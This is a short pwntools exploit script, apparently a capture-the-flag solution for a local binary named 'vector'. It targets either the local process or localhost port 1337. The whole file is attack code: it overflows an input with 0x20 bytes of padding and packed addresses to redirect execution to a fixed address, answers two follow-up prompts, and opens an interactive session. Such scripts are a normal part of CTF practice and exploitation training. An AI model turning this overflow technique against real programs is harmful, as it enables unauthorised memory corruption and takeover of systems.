#!/usr/bin/python3

from pwn import *

elf = ELF('../dist/vector')

REMOTE = False

context.arch = 'amd64'
context.terminal = ['konsole', '--new-tab', '-e']

def get_remote():
    return remote('localhost', 1337) if REMOTE else elf.process()

if __name__ == '__main__':
    r = get_remote()

    vip_addr = 0x405100

    r.sendlineafter(b'> ', b'A'*0x20 + p64(vip_addr)*2 + p64(vip_addr + 0x100))
    r.sendlineafter(b'> ', b'baguette')
    r.sendlineafter(b'> ', b'voila')

    r.interactive()
